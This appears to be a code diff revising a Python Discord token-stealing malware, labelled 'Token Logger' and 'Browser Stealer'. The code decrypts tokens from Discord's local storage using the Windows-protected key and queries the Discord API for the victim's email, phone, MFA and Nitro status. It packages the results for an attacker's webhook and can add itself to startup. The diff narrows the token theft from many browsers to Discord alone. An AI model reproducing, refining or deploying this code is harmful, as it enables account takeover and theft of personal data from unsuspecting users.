@@ -1,15 +1,11 @@
-from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-from os import listdir
-from json import loads
-from re import findall
+import re
 from subprocess import Popen, PIPE
 import requests, os
-from datetime import datetime
+from datetime import datetime, timedelta
 import json
 import shutil
-from datetime import timedelta
 import sqlite3
 import base64
 import io
@@ -18,20 +14,11 @@ import platform
 import subprocess
 import pyautogui
 from io import BytesIO
-import getpass
 import sys
+import getpass
 
 webhook_url = "{webhook_placeholder}"
 startup_add = "{startup_placeholder}"
-
-## Token Logger
-tokens = []
-cleaned = []
-checker = []
-
-import os
-import getpass
-import sys
 
 def add_to_startup():
     if startup_add:
@@ -55,104 +42,81 @@ def add_to_startup():
         return "Add to startup not enabled."
 
 
-
-def decrypt(buff, master_key):
+## Token Logger
+def get_key() -> str:
+    roaming: str = os.getenv("APPDATA")
+    path: str = roaming + '\\discord'
+    if not os.path.exists(path): pass
     try:
-        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+        with open(path + f"\\Local State", "r") as file:
+            key = json.loads(file.read())['os_crypt']['encrypted_key']
+            return key
+    except Exception as e:
+        print(e)
+
+def get_token() -> str:
+    tokens: list = []
+    roaming: str = os.getenv("APPDATA")
+    path: str = roaming + '\\discord'
+
+    for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+        else:
+            try:
+                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                    for x in files.readlines():
+                        x.strip()
+                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                            tokens.append(values)
+            except Exception as e:
+                continue
+    return tokens
+
+def decrypt(b: str, master_key: str) -> str:
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, b[3:15]).decrypt(b[15:])[:-16].decode()
     except:
         return "Error"
-def get_token():
-    already_check = []
-    checker = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    chrome = local + "\\Google\\Chrome\\User Data"
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Lightcord': roaming + '\\Lightcord',
-        'Discord PTB': roaming + '\\discordptb',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Amigo': local + '\\Amigo\\User Data',
-        'Torch': local + '\\Torch\\User Data',
-        'Kometa': local + '\\Kometa\\User Data',
-        'Orbitum': local + '\\Orbitum\\User Data',
-        'CentBrowser': local + '\\CentBrowser\\User Data',
-        '7Star': local + '\\7Star\\7Star\\User Data',
-        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': local + "\\Google\\Chrome\\User Data\\Default",
-        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
-        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': local + '\\Iridium\\User Data\\Default'
-    }
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        try:
-            with open(path + f"\\Local State", "r") as file:
-                key = loads(file.read())['os_crypt']['encrypted_key']
-                file.close()
-        except: continue
-        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
-            if not file.endswith(".ldb") and file.endswith(".log"): continue
-            else:
-                try:
-                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
-                        for x in files.readlines():
-                            x.strip()
-                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                tokens.append(values)
-                except PermissionError: continue
-        for i in tokens:
-            if i.endswith("\\"):
-                i.replace("\\", "")
-            elif i not in cleaned:
-                cleaned.append(i)
-        for token in cleaned:
+
+def get_info(tokens) -> dict:
+    for raw_token in tokens:
+        for tk in tokens:
+            if tk.endswith("\\"):
+                tk.replace("\\", "")
+        for raw_token in tokens:
             try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-            except IndexError == "Error": continue
-            checker.append(tok)
-            for value in checker:
-                if value not in already_check:
-                    already_check.append(value)
-                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
-                    try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-                    except: continue
-                    if res.status_code == 200:
-                        res_json = res.json()
-                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
-                        user_id = res_json['id']
-                        email = res_json['email']
-                        phone = res_json['phone']
-                        mfa_enabled = res_json['mfa_enabled']
-                        has_nitro = False
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-                        nitro_data = res.json()
-                        has_nitro = bool(len(nitro_data) > 0)
-                        days_left = 0
-                        if has_nitro:
-                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            days_left = abs((d2 - d1).days)
-                        return {
-                            "username": user_name,
-                            "userid": user_id,
-                            "email": email,
-                            "phone": phone,
-                            "mfa": mfa_enabled,
-                            "nitro": {
-                                "nitrostatus": has_nitro,
-                                "expires": days_left if days_left else "None",
-                            },
-                            "token": tok
-                        }
+                token = decrypt(base64.b64decode(raw_token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(get_key())[5:])
+            except IndexError == "Error":
+                continue
+        
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        }
+        
+        try:
+            response = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+        except Exception as e:
+            print(e)
+        try:
+            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
+        except Exception as e:
+            print(e)
+        
+        if response.status_code == 200:
+            r = response.json()
+            return {
+                "username": r['username'] + '#' + r['discriminator'],
+                "userid": r["id"],
+                "email": r["email"],
+                "phone": r["phone"],
+                "mfa": r["mfa_enabled"],
+                "nitro": bool(len(nitro_data) > 0),
+                "token": token
+            }
+        else:
+            print(response.status_code)
 
 ## Browser Stealer
 appdata = os.getenv('LOCALAPPDATA')
@@ -397,7 +361,7 @@ def get_ip():
 ## Webhook message
 
 ## embed constructor:
-t = get_token()
+t = get_info(get_token())
 
 embed = {
     "username": "Token Logger :3",
@@ -439,12 +403,7 @@ embed = {
                 },
                 {
                     "name": "Nitro",
-                    "value": f'`{t["nitro"]["nitrostatus"]}`',
-                    "inline": True
-                },
-                {
-                    "name": "Expires in",
-                    "value": f'`{t["nitro"]["expires"]}`',
+                    "value": f'`{t["nitro"]}`',
                     "inline": True
                 },
                 {
